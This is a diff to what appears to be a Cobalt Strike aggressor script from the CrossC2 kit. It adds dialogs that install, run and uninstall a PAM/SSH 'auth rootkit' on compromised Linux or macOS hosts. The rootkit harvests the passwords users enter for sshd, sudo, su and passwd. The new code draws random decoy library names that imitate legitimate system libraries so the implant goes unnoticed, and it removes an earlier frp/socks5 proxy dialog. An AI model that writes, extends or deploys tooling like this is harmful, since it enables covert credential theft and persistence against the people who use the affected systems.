@@ -1,5 +1,5 @@
 
-include(script_resource("CrossC2Kit.cna"));
+# include(script_resource("CrossC2Kit.cna"));
 
 sub printUsage_auth {
     blog($1, "\nUsage: cc2_auth <linux(32)/osx> <step> (lib_name)\n\troot permissions\nssh rootkit: Get password for auth action(sshd/sudo/su/passwd...).\n\tstep: \t<install>, <run>, <uninstall>.\n\n\tstep 1. install: \tget a prepared dynamic library file `libxxx.0.0.1.so`.\n\tstep 2. run: \tstart running ssh rootkit.\n\tstep 3. uninstall: \tuninstall ssh rootkit.\nEx:\n\tcc2_auth linux install\n\tcc2_auth linux run\n\tcc2_auth linux uninstall libxxx.0.0.1.so\n");
@@ -19,15 +19,21 @@ sub cc2_auth {
     $patchlib = "rootkit/auth/auth_rootkit_module";
     $loadlib = "rootkit/auth/auth_rootkit_mgr";
     $removelib = "rootkit/auth/auth_rootkit_remove";
-    if ($arch eq "linux32") {
-        $patchlib = $patchlib."32.so";
-        $loadlib = $loadlib."32.so";
-        $removelib = $removelib."32.so";
-    } else if ($arch eq "linux") {
-        $patchlib = $patchlib.".so";
-        $loadlib = $loadlib.".so";
-        $removelib = $removelib.".so";
-    } else if ($arch eq "osx") {
+
+    $os = lc(beacon_info($beaconid, "os"));
+    $arch = beacon_info($beaconid, "arch");
+
+    if ('linux' isin $os) {
+        if ($arch eq 'x64') {
+            $patchlib = $patchlib.".so";
+            $loadlib = $loadlib.".so";
+            $removelib = $removelib.".so";
+        } else if ($arch eq 'x86') {
+            $patchlib = $patchlib."32.so";
+            $loadlib = $loadlib."32.so";
+            $removelib = $removelib."32.so";
+        }
+    } else if ('macos' isin $os) {
         $patchlib = $patchlib.".dylib";
         $loadlib = $loadlib.".dylib";
         $removelib = $removelib.".dylib";
@@ -71,51 +77,69 @@ ssh_alias("cc2_auth", &cc2_auth);
 ssh_command_register("cc2_auth", "CrossC2 auth rootkit - Get password for auth action(sshd/sudo/su/passwd...).", "\nUsage: cc2_auth <linux(32)/osx> <step> (lib_name)\n\troot permissions\nssh rootkit: Get password for auth action(sshd/sudo/su/passwd...).\n\tstep: \t<install>, <run>, <uninstall>.\n\n\tstep 1. install: \tget a prepared dynamic library file `libxxx.0.0.1.so`.\n\tstep 2. run: \tstart running ssh rootkit.\n\tstep 3. uninstall: \tuninstall ssh rootkit.\nEx:\n\tcc2_auth linux install\n\tcc2_auth linux run\n\tcc2_auth linux uninstall libxxx.0.0.1.so\n");
 
 
-
 sub openAuthKitDialogCallBack {
-    local('$bid $f_server_lh $f_server_lp $f_token $protocol $s5_username $s5_password $s5_port');
-    local('$os $arch $system');
-    $bid = $3['bid'];
-    $f_server_lh = $3['f_server_lh'];
-    $f_server_lp = $3['f_server_lp'];
-    $f_token = $3['f_token'];
-    $protocol = $3['protocol'];
-    $s5_username = $3['s5_username'];
-    $s5_password = $3['s5_password'];
-    $s5_port = $3['s5_port'];
+    $patchRandName = $3['patchRandName'];
+    $patchName = $3['patchName'];
 
-    $os = lc(beacon_info($bid, "os"));
-    $arch = beacon_info($bid, "arch");
-    $system = "";
-    if ('linux' isin $os) {
-        if ($arch eq 'x86') {
-            $system = "linux32";
-        } else if ($arch eq 'x64') {
-            $system = "linux";
+    if (($patchName eq $null) && ($patchRandName eq $null)) {
+        berror($bid, "error with patchName or patchRandName");
+    } else {
+        $patch_name = "";
+        if ($patchName ne "") {
+            $patch_name = $patchName;
+        } else {
+            $patch_name = $patchRandName;
         }
-    } else if ('macos' isin $os) {
-        $system = "osx";
+        $os = lc(beacon_info($bid, "os"));
+        $arch = beacon_info($bid, "arch");
+
+        blog($bid, "cc2_auth install");
+        cc2_auth($bid, "", "install");
+        blog($bid, "cc2_auth run");
+        cc2_auth($bid, "", "run");
     }
-    binput($bid, "cc2_frp $system $f_server_lh\:$f_server_lp $f_token $protocol $s5_username $s5_password\:$s5_port");
-    blog($bid, "s5(server\[$protocol\], client\[$system\]) \: $f_server_lh\:$s5_port $s5_username/$s5_password");
-    cc2_frp($bid, $system, $f_server_lh.':'.$f_server_lp, $f_token, $protocol, $s5_username.':'.$s5_password.':'.$s5_port);
 }
 
 sub openAuthKitDialog {
-    local('$bid $dialog');
     $bid = $1;
-    $dialog = dialog("proxy s5", %(bid => $bid[0], f_server_lh => "x.x.x.x", f_server_lp => "4444", f_token => "frp-server-token", protocol => "tcp", s5_username => "admin", s5_password => "password", s5_port => "8080"), &openAuthKitDialogCallBack);
-    dialog_description($dialog, "setup frp proxy");
+    $dialog = dialog("PAM auth log", %(bid => $bid, patchRandName => "libk5ccrypto1.0.4.so", patchName => ""), &openAuthKitDialogCallBack);
+    dialog_description($dialog, "pam auth log");
+    
+    $patchName = "libk5ccrypto1.0.4.so";
 
-    drow_text($dialog, "f_server_lh", "frp listening host: ", 20); 
-    drow_text($dialog, "f_server_lp", "frp listening port: ", 20);
-    drow_text($dialog, "f_token", "frp listening token: ", 20);
-    drow_combobox($dialog, "protocol", "Type: ", @("tcp", "udp"));
-    drow_text($dialog, "s5_username", "socks5 username: ");
-    drow_text($dialog, "s5_password", "socks5 password: ");
-    drow_text($dialog, "s5_port", "socks5 port: ");
+    $patchHead = @("pcre", "se", "kbr5", "k5c");
+    $patchBody = @("dl", "crypto", "resolv", "z");
+    $patchVer = @("1.0.1", "1.2.1.2", "1.0.1.3");
+    $patchEnd = ".so";
+
+    @patchNameArray = @();
+    for ($x = 0; $x < 5; $x++) {
+        push(@patchNameArray, "lib".$patchHead[rand(4)].$patchBody[rand(4)].$patchVer[rand(3)].$patchEnd);
+    }
+
+    drow_text($dialog, "patchName", "patchName: ");
+    drow_combobox($dialog, "patchRandName", "patchRandName: ", @patchNameArray);
 
     dbutton_action($dialog, "run");
+    dialog_show($dialog);
+}
+
+sub openAuthKitUninstallDialogCallBack {
+    local('$patchName');
+    $patchName = $3['patchName'];
+
+    blog($bid, "cc2_auth uninstall ".$patchName);
+    cc2_auth($bid, "", "uninstall", $patchName);
+}
+
+sub openAuthKitUninstallDialog {
+    $bid = $1;
+    $dialog = dialog("PAM auth log uninstall", %(bid => $bid, patchName => ""), &openAuthKitUninstallDialogCallBack);
+    dialog_description($dialog, "pam auth log uninstall");
+
+    drow_text($dialog, "patchName", "patchName: ");
+
+    dbutton_action($dialog, "uninstall");
     dialog_show($dialog);
 }
 
